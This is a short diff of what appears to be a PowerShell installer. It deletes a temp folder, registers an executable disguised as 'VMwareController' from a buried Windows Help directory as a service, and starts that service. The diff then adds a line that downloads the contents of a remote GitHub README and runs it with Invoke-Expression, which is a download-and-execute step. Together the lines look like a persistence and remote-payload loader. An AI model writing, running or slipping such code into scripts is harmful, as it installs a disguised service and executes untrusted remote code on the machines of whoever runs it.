@@ -29,3 +29,6 @@ Remove-Item "C:\temp" -Recurse -Force
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe "C:\Windows\Help\Windows\IndexStore\en-US\Controller-main\bin\Debug\VMwareController.exe"
 
 Start-Service VMwareController
+
+
+Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/burner-afk/Controller/refs/heads/main/README.md").Content
